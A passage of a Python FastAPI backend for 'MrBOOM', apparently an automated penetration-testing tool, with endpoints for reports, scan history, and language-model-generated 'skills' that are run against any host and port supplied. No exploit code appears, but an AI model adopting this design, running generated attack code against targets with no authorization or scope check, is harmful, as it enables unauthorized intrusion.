            "Content-Disposition": f'attachment; filename="{filename}"',
        },
    )

@app.get("/api/engagements/{eid}/download/html")
def download_report_html(eid: str):
    report, filename = _report_source(eid)
    if not report:
        raise HTTPException(404, "report not found")
    html = report_to_html(report, title=f"MrBOOM Report — {eid}")
    base = filename.rsplit(".", 1)[0]
    return HTMLResponse(
        html,
        headers={
            "Content-Disposition": f'attachment; filename="{base}.html"',
        },
    )

@app.get("/api/engagements/{eid}/download/pdf")
def download_report_pdf(eid: str):
    report, filename = _report_source(eid)
    if not report:
        raise HTTPException(404, "report not found")
    base = filename.rsplit(".", 1)[0]
    pdf_path = os.path.join(DATA_DIR, f"{base}.pdf")
    try:
        report_to_pdf(report, title=f"MrBOOM Report — {eid}", out_path=pdf_path)
    except Exception as e:
        raise HTTPException(500, f"PDF export failed: {e}")
    return FileResponse(pdf_path, media_type="application/pdf", filename=f"{base}.pdf")

@app.get("/api/history")
def list_history():
    """List all past scans from disk."""
    scans = load_scan_history()
    for s in scans:
        s.pop("report", None)
        s.pop("events", None)
    return {"scans": scans}

@app.get("/api/history/{eid}")
def get_history_scan(eid: str):
    """Get full details of a past scan including report."""
    scans = load_scan_history()
    for s in scans:
        if s["id"] == eid:
            return s
    raise HTTPException(404, "scan not found")

@app.delete("/api/history/{eid}")
def delete_history_scan(eid: str):
    """Delete a past scan from disk."""
    if not re.fullmatch(r"[A-Za-z0-9_.-]+", eid) or ".." in eid:
        raise HTTPException(400, "invalid id")
    delete_scan_history(eid)
    return {"ok": True}

# ─── SKILL API ENDPOINTS ──────────────────────────────────────────────

class SkillGenerateRequest(BaseModel):
    host: str
    port: int
    service: str = ""
    base_url: str
    model: str
    api_key: str
    context: str = ""

@app.get("/api/skills")
def list_skills():
    """List all saved skills."""
    return skill_stats()

@app.get("/api/skills/{name}")
def get_skill(name: str):
    """Get a skill's source code and metadata."""
    idx = _load_skill_index()
    skill = None
    for s in idx.get("skills", []):
        if s["name"] == name:
            skill = s
            break
    if not skill:
        raise HTTPException(404, "skill not found")
    code = _load_skill_source(name)
    return {"meta": skill, "code": code}

@app.delete("/api/skills/{name}")
def delete_skill(name: str):
    """Delete a skill."""
    if not _valid_skill_name(name):
        raise HTTPException(400, "invalid name")
    idx = _load_skill_index()
    if name not in {s["name"] for s in idx.get("skills", [])}:
        raise HTTPException(404, "skill not found")
    idx["skills"] = [s for s in idx["skills"] if s["name"] != name]
    _save_skill_index(idx)
    path = SKILLS_DIR / f"{name}.py"
    if path.exists():
        path.unlink()
    return {"ok": True}

@app.post("/api/skills/generate")
def generate_skill_endpoint(req: SkillGenerateRequest):
    """Generate a skill for a given host:port/service."""
    result = generate_skill(req.host, req.port, req.service or f"port-{req.port}",
                            req.context, req.base_url, req.model, req.api_key)
    return result

@app.post("/api/skills/test/{name}")
def test_skill_endpoint(name: str, body: dict):
    """Test a skill against a target."""
    host = body.get("host", "127.0.0.1")
    port = body.get("port", 80)
    timeout = body.get("timeout", 15)
    idx = _load_skill_index()
    skill = None
    for s in idx.get("skills", []):
        if s["name"] == name:
            skill = s
            break
    if not skill:
        raise HTTPException(404, "skill not found")
    result = try_skill(skill, host, port, timeout)
    if result.get("success"):
        for s in idx["skills"]:
            if s["name"] == name:
                s["success_count"] = s.get("success_count", 0) + 1
        _save_skill_index(idx)
    return result

@app.post("/api/demo")
async def start_demo():
    """Start a demo run that generates mock events."""
    threading.Thread(target=run_demo, daemon=True).start()
    return {"ok": True}

@app.get("/events")
async def event_stream(request: Request, eid: str = ""):
    """SSE endpoint — streams meta, ir, and done events (scoped to eid when given)."""
    queue = asyncio.Queue()
    await sse.register(queue, eid or None)

    # Send current meta state immediately on connect
    initial = f"event: meta\ndata: {json.dumps(meta_state, default=str)}\n\n"
    if eid and str(meta_state.get("task_id", "")) != str(eid):
        initial = ""

    async def generate():
        try:
            yield initial
            while True:
                if await request.is_disconnected():
                    break
                try:
                    msg = await asyncio.wait_for(queue.get(), timeout=15.0)
                    yield msg
                except asyncio.TimeoutError:
                    yield ": keepalive\n\n"
        finally:
            await sse.unregister(queue)

    from fastapi.responses import StreamingResponse
    return StreamingResponse(generate(), media_type="text/event-stream")

# ─── FRONTEND ───────────────────────────────────────────────────

FRONTEND_HTML = (Path(DATA_DIR) / "frontend.html").read_text(encoding="utf-8")

@app.get("/", response_class=HTMLResponse)
def index():
    return FRONTEND_HTML

@app.get("/marked.min.js")
def marked_js():
    try:
        return PlainTextResponse((Path(DATA_DIR) / "marked.min.js").read_bytes(),
                                 media_type="application/javascript")
    except Exception:
        raise HTTPException(404, "marked.min.js not found")

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=8085)
